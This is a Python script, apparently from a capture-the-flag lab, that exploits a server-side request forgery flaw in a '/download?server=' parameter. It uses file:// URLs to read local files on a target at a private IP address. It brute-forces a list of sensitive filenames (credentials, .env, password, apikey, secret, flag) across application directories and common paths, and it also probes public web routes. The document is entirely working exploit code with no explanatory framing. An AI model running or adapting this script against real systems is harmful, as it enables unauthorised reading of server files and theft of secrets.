"""Search for txt files - HTTP-based approach (no fd reading)."""
import requests

T = "http://10.82.168.213"

def try_file(path):
    """Read file via file:// SSRF. Returns content or None."""
    try:
        r = requests.get(f"{T}/download?server=file://{path}?&id=1", timeout=8)
        if r.status_code == 200:
            text = r.content.decode(errors="replace")
            if "Werkzeug" not in text and len(r.content) > 0:
                return text
    except:
        pass
    return None

# Big list of filenames
names = [
    "flag", "Flag", "FLAG", "secret", "Secret", "note", "notes", "readme",
    "README", "Readme", "info", "config", "credentials", "password",
    "key", "apikey", "api_key", "hint", "todo", "TODO", "text",
    "data", "backup", "old", "test", "hidden", ".flag", ".secret",
    ".hidden", ".env", "env", "robots", "sitemap", "changelog",
    "CHANGELOG", "license", "LICENSE", "VERSION", "version",
    "flag1", "flag2", "thm", "ctf", "web",
]
exts = [".txt", ""]

# 1. Check via public-docs route (HTTP)
print("[1] HTTP: /public-docs-k057230990384293/...")
for name in names:
    for ext in exts:
        url = f"{T}/public-docs-k057230990384293/{name}{ext}"
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                print(f"  [FOUND] {url}: {r.text[:200]}")
        except:
            pass

# 2. Check via /static/ (HTTP)
print("\n[2] HTTP: /static/...")
for name in names:
    for ext in exts:
        url = f"{T}/static/{name}{ext}"
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                print(f"  [FOUND] {url}: {r.text[:200]}")
        except:
            pass

# 3. File SSRF on specific directories
print("\n[3] file:// SSRF on key directories...")
dirs = [
    "/usr/src/app",
    "/usr/src/app/static",
    "/usr/src/app/public-docs",
    "/usr/src/app/private-docs",
    "/usr/src",
]
for d in dirs:
    for name in names:
        for ext in exts:
            data = try_file(f"{d}/{name}{ext}")
            if data:
                print(f"  [FOUND] {d}/{name}{ext}: {data[:200]}")

# 4. Also check some more creative paths
print("\n[4] Creative paths...")
creative = [
    "/usr/src/app/requirements.txt",
    "/usr/src/requirements.txt",
    "/opt/flag.txt",
    "/var/flag.txt",
    "/home/flag.txt",
    "/usr/src/app/public-docs/1.txt",
    "/usr/src/app/public-docs/2.txt",
    "/usr/src/app/public-docs/plant.txt",
    "/usr/src/app/private-docs/secret.txt",
    "/usr/src/app/private-docs/admin.txt",
    "/usr/src/app/private-docs/credentials.txt",
    "/usr/src/app/static/imgs/flag.txt",
]
for p in creative:
    data = try_file(p)
    if data:
        print(f"  [FOUND] {p}: {data[:200]}")
